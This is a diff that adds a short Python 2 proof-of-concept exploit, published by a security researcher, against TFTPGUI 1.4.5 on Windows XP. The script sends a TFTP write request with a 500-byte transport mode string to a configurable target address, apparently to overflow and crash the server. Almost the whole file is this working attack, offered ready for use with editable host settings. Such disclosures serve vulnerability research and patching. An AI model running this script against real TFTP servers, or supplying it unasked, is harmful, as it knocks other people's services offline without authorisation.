@@ -1,0 +1,42 @@
+# Exploit Title: TFTPGUI Long Transport Mode Overflow
+# Date: 5/1/2010
+# Author: Jeremiah Talamantes
+# Software Link: http://sourceforge.net/projects/tftputil/files/TFTPUtil/TFTPUtil%20Version%201.4.5/TFTPUtil_GUI_Version_1.4.5_Binary_Installer.exe/download
+# Version: 1.4.5
+# Tested on: Windows XP, SP2 (En)
+# CVE : N/A
+
+#!/usr/bin/python
+print "\n#################################################################"
+print "##                      RedTeam Security                       ##"
+print "##             TFTPGUI Long Transport Mode Overflow            ##"
+print "##                        Version 1.4.5                        ##"
+print "##                      LIST Vulnerability                     ##"
+print "##                                                             ##"
+print "##                     Jeremiah Talamantes                     ##"
+print "##                   labs@redteamsecure.com                    ##"
+print "################################################################# \n"
+
+import socket
+import sys
+
+# Change these values to suit your needs
+host = '192.168.1.108'
+port = 69
+ 
+try:
+   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+except:
+   print "Error: unable to connect."
+   sys.exit(1)
+ 
+# Creating the overly long transport mode string 
+fn = "A"
+md = "A" * 500
+stuff = "\x00\x02" + fn + "\0" + md + "\0"
+
+# Send data
+s.sendto(stuff, (host, port))
+print "Check to see if TFTPGUI is still running..."
+
+# End
